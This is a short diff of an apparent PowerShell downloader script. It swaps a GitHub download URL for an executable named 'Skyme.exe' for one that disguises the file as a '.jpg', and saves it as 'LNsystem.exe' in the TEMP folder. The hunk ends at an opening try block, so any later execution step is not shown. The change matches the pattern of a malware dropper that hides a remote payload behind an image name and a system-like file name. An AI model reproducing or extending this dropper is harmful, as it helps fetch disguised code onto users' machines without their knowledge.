@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/dimongick/checker/refs/heads/main/Skyme.exe"
+$url = "https://raw.githubusercontent.com/dimongick/checker/refs/heads/main/32bdfe5a5e062cb5171d24112398d68a.jpg"
 $outputPath = "$env:TEMP\LNsystem.exe"
 
 try {
